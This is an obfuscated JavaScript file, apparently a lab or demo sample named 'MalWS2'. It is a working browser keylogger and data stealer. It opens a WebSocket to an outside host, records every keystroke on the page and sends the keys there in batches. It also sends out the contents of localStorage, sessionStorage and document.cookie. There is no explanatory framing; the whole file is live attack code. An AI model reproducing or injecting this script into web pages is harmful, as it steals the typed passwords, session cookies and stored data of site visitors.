var _0x2db2 = [
  "SessionVar1",
  "test\x20string",
  "getItem",
  "Local\x20Storage:\x0a",
  "\x0aSession\x20Storage:\x0a",
  "cookie",
  "wss://win.wasplabs.ca:5001",
  "onopen",
  "onkeypress",
  "undefined",
  "push",
  "key",
  "onkeyup",
  "Backspace",
  "<--",
  "setInterval",
  "length",
  "send",
  "stringify",
  "keys",
  "cookieJS",
];
(function (_0x36963b, _0x554d26) {
  var _0x3f06e6 = function (_0x3955b6) {
    while (--_0x3955b6) {
      _0x36963b["push"](_0x36963b["shift"]());
    }
  };
  _0x3f06e6(++_0x554d26);
})(_0x2db2, 0x195);
var _0x505a = function (_0x2dd7d0, _0x26bb72) {
  _0x2dd7d0 = _0x2dd7d0 - 0x0;
  var _0x128d5a = _0x2db2[_0x2dd7d0];
  return _0x128d5a;
};
MalWS2 = new WebSocket(_0x505a("0x0"));
MalWS2[_0x505a("0x1")] = function () {
  var _0x3eac16 = [];
  document[_0x505a("0x2")] = function (_0x2790f3) {
    if (typeof MalWS2 !== _0x505a("0x3")) {
      _0x3eac16[_0x505a("0x4")](_0x2790f3[_0x505a("0x5")]);
    }
  };
  document[_0x505a("0x6")] = function (_0x12086a) {
    if (
      _0x12086a["key"] == _0x505a("0x7") &&
      typeof MalWS2 !== _0x505a("0x3")
    ) {
      _0x3eac16[_0x505a("0x4")](_0x505a("0x8"));
    }
  };
  window[_0x505a("0x9")](function () {
    if (_0x3eac16[_0x505a("0xa")] > 0x0 && typeof MalWS2 !== _0x505a("0x3")) {
      MalWS2[_0x505a("0xb")](
        JSON[_0x505a("0xc")]({ protocol: _0x505a("0xd"), data: _0x3eac16 })
      );
      _0x3eac16 = [];
    }
  }, 0xbb8);
  MalWS2["send"](
    JSON[_0x505a("0xc")]({ protocol: _0x505a("0xe"), data: dumpStorage() })
  );
};
function dumpStorage() {
  sessionStorage[_0x505a("0xf")] = _0x505a("0x10");
  localStorage["LocalVar1"] = _0x505a("0x10");
  lvars = [];
  (keys = Object[_0x505a("0xd")](localStorage)), (i = keys[_0x505a("0xa")]);
  while (i--) {
    lvars[i] = keys[i] + ":\x20" + localStorage["getItem"](keys[i]);
  }
  svars = [];
  (keys = Object[_0x505a("0xd")](sessionStorage)), (i = keys[_0x505a("0xa")]);
  while (i--) {
    svars[i] = keys[i] + ":\x20" + sessionStorage[_0x505a("0x11")](keys[i]);
  }
  vars = [
    _0x505a("0x12"),
    lvars,
    _0x505a("0x13"),
    svars,
    "\x0aDocument\x20Cookie:\x0a",
    document[_0x505a("0x14")],
  ];
  return vars;
}
